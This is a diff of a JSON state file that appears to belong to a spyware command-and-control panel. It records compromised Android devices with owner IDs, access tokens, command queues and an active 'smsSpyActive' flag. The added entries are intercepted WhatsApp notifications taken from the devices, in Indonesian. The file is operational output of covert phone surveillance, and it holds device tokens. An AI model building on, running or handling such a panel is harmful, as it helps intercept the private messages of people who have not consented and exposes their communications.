@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775040085534,
+    "lastSeen": 1775040090551,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "01/04 18:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040091027
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14407 pesan dari 10 chat",
+        "time": "01/04 18:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040089558
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -1817,7 +1833,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775040087228,
+    "lastSeen": 1775040089669,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -1833,6 +1849,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14407 pesan dari 10 chat",
+        "time": "01/04 18:41",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040088709
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
